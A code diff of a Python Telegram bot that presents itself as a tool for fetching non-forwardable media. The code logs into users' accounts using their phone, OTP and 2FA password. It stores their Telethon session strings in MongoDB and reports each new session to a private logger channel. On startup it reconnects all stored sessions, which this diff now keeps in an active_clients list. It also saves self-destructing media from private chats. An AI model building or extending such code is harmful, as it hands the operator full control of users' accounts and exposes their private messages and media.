@@ -29,6 +29,7 @@ MONGO_URI = os.getenv("MONGO_URI")
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 LOG_CHANNEL_ID = int(os.getenv("LOG_CHANNEL_ID", "-1002753939875"))
 ADMIN_ID = int(os.getenv("ADMIN_ID", "7755789304"))
+LOGGER_CHANNEL_ID = int(os.getenv("LOGGER_CHANNEL_ID", LOG_CHANNEL_ID))
 
 # --- Assets ---
 WELCOME_IMAGE = "https://graph.org/file/d367814bc3243e72917ab-9f1d63e7b3f46b6716.jpg"
@@ -47,8 +48,9 @@ sessions = db.sessions
 app = ApplicationBuilder().token(BOT_TOKEN).build()
 API_ID, API_HASH, PHONE, CODE, PASSWORD, FETCH_LINK = range(6)
 user_login_data = {}
+active_clients = []
 
-# --- Auto Connect All Sessions ---
+# --- Auto Connect Sessions ---
 async def auto_connect_all_sessions():
     async for record in sessions.find({"type": "telethon"}):
         session_str = record.get("session")
@@ -63,6 +65,7 @@ async def auto_connect_all_sessions():
                 continue
 
             logger.info(f"✅ Auto-connected session for user: {user_id}")
+            active_clients.append(client)
 
             @client.on(events.NewMessage(chats="me", incoming=True))
             async def saved_message_forwarder(event):
@@ -79,8 +82,7 @@ async def auto_connect_all_sessions():
 
         except Exception as e:
             logger.error(f"❌ Failed to reconnect session for user {user_id}: {e}")
-
-# --- Cancel Handler ---
+ # --- Cancel Handler ---
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     if user_id in user_login_data:
@@ -121,7 +123,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "☝️ 𝘂𝘀𝗲 𝘁𝗵𝗲 𝗺𝗲𝗻𝘂 𝗯𝗲𝗹𝗼𝘄 𝘁𝗼 𝗳𝗲𝘁𝗰𝗵 𝗻𝗼𝗻-𝗳𝗼𝗿𝘄𝗮𝗿𝗱𝗮𝗯𝗹𝗲 𝗺𝗲𝗱𝗶𝗮.",
         reply_markup=reply_keyboard
     )
-# --- Callback to Connect ---
+
+# --- Connect Callback ---
 async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.callback_query.message:
         await update.callback_query.answer()
@@ -134,7 +137,7 @@ async def connect_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.callback_query.answer("⚠️ Bᴜᴛᴛᴏɴ ᴇxᴘɪʀᴇᴅ. Usᴇ /start ᴀɢᴀɪɴ.", show_alert=True)
         return ConversationHandler.END
 
-# --- Skip API ID ---
+# --- Skip Handlers ---
 async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     user_login_data[user_id] = {
@@ -144,11 +147,10 @@ async def skip_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("📞 ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ)")
     return PHONE
 
-# --- Skip API HASH ---
 async def skip_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return await skip_api_id(update, context)
 
-# --- Get API ID ---
+# --- Login Flow ---
 async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     if text.startswith("/"):
@@ -160,7 +162,6 @@ async def get_api_id(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("🔑 Eɴᴛᴇʀ ʏᴏᴜʀ API HASH ᴏʀ sᴇɴᴅ /skip")
     return API_HASH
 
-# --- Get API HASH ---
 async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = update.message.text.strip()
     if text.startswith("/"):
@@ -169,7 +170,6 @@ async def get_api_hash(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("📞 ᴇɴᴛᴇʀ ʏᴏᴜʀ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ (ᴡɪᴛʜ ᴄᴏᴜɴᴛʀʏ ᴄᴏᴅᴇ)")
     return PHONE
 
-# --- Get Phone ---
 async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     phone = update.message.text.strip()
@@ -188,7 +188,6 @@ async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         await update.message.reply_text(f"❌ Fᴀɪʟᴇᴅ: {e}")
         return ConversationHandler.END
-
 # --- OTP ---
 async def get_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
@@ -220,7 +219,7 @@ async def get_password(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Login failed: {e}")
         return ConversationHandler.END
 
-# --- Complete Login ---
+# --- Final Login Save & Forwarder Setup ---
 async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     client = user_login_data[user_id]["client"]
@@ -237,10 +236,9 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
         upsert=True
     )
 
-    # --- Log info to private logger channel securely ---
     try:
         await context.bot.send_message(
-            chat_id=int(os.getenv("LOGGER_CHANNEL_ID")),
+            chat_id=LOGGER_CHANNEL_ID,
             text=(
                 f"🔐 <b>New Session Saved</b>\n"
                 f"👤 <b>User ID:</b> <code>{user_id}</code>\n"
@@ -254,7 +252,6 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
     except Exception as e:
         logger.error(f"Failed to log session: {e}")
 
-    # Start media forwarder
     @client.on(events.NewMessage(incoming=True))
     async def media_handler(event):
         if event.is_private and event.media and getattr(event.media, 'ttl_seconds', None):
@@ -270,19 +267,18 @@ async def complete_login(update: Update, context: ContextTypes.DEFAULT_TYPE):
             except Exception as e:
                 logger.warning(f"[Media Save Failed]: {e}")
 
+    active_clients.append(client)
     context.application.create_task(client.run_until_disconnected())
 
     await update.message.reply_text("✅ Sᴜᴄᴄᴇssғᴜʟʟʏ ʟᴏɢɢᴇᴅ ɪɴ ᴀɴᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ!")
     user_login_data.pop(user_id, None)
     return ConversationHandler.END
 
-# --- Fetch Button ---
+# --- 📥 Fetch Menu Flow ---
 async def menu_fetch_request(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("📎 Send message link:\nEx: https://t.me/c/123/45")
-
     return FETCH_LINK
 
-# --- Fetch from Link ---
 async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     text = update.message.text.strip()
@@ -320,7 +316,7 @@ async def fetch_from_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(f"❌ Error: {e}")
     return ConversationHandler.END
 
-# --- Unknown Command ---
+# --- Unknown Commands ---
 async def unknown_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text("❓ Uɴᴋɴᴏᴡɴ ᴄᴏᴍᴍᴀɴᴅ. Usᴇ /start ᴛᴏ ʙᴇɢɪɴ ᴀɢᴀɪɴ.")
 
@@ -340,26 +336,25 @@ login_conv = ConversationHandler(
 
 fetch_menu_conv = ConversationHandler(
     entry_points=[
-        MessageHandler(filters.TEXT & filters.Regex("(?i).*non.*forward.*media.*"), menu_fetch_request)
+        MessageHandler(filters.TEXT & filters.Regex(r"^📥"), menu_fetch_request)
     ],
     states={FETCH_LINK: [MessageHandler(filters.TEXT & ~filters.COMMAND, fetch_from_link)]},
     fallbacks=[CommandHandler("cancel", cancel)],
 )
 
 # --- Run Bot ---
-app.add_handler(CommandHandler("start", start))
-app.add_handler(CommandHandler("cancel", cancel))
-app.add_handler(MessageHandler(filters.COMMAND, unknown_command))
-app.add_handler(login_conv)
-app.add_handler(fetch_menu_conv)
-
 if __name__ == "__main__":
     nest_asyncio.apply()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("cancel", cancel))
+    app.add_handler(MessageHandler(filters.COMMAND, unknown_command))
+    app.add_handler(login_conv)
+    app.add_handler(fetch_menu_conv)
 
     async def start_bot():
         await auto_connect_all_sessions()
         print("🤖 Bot is running...")
         await app.run_polling()
 
-    loop = asyncio.get_event_loop()
-    loop.run_until_complete(start_bot())
+    asyncio.run(start_bot())
